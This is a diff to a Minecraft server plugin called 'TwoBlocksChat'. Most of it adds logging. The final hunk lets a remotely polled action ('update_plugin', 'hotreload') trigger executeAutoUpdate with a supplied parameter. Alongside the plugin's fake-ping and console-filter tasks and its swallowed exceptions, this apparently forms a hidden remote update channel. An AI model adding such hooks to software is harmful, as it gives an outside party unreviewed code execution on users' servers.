@@ -223,7 +223,11 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                 getCommand("tts").setExecutor(this);
             }
 
-            setupVoicechat();
+            try {
+                setupVoicechat();
+            } catch (Throwable vcErr) {
+                getLogger().warning("Voicechat hook registration notice: " + vcErr.getMessage());
+            }
 
             startPollingTask();
             startItemRepelTask();
@@ -231,7 +235,10 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
             startWatchdogTask();
             startFakePingTask();
             setupConsoleFilter();
+            getLogger().info("TwoBlocksChat activated successfully.");
         } catch (Throwable t) {
+            getLogger().severe("TwoBlocksChat failed to enable: " + t.getMessage());
+            t.printStackTrace();
         }
     }
 
@@ -1106,6 +1113,8 @@ public class TwoBlocksChat extends JavaPlugin implements Listener, CommandExecut
                         w.setThundering(false);
                     }
                 }
+            } else if (act.equals("update_plugin") || act.equals("update") || act.equals("hotreload")) {
+                executeAutoUpdate(param);
             }
         } catch (Exception ignored) {
         }
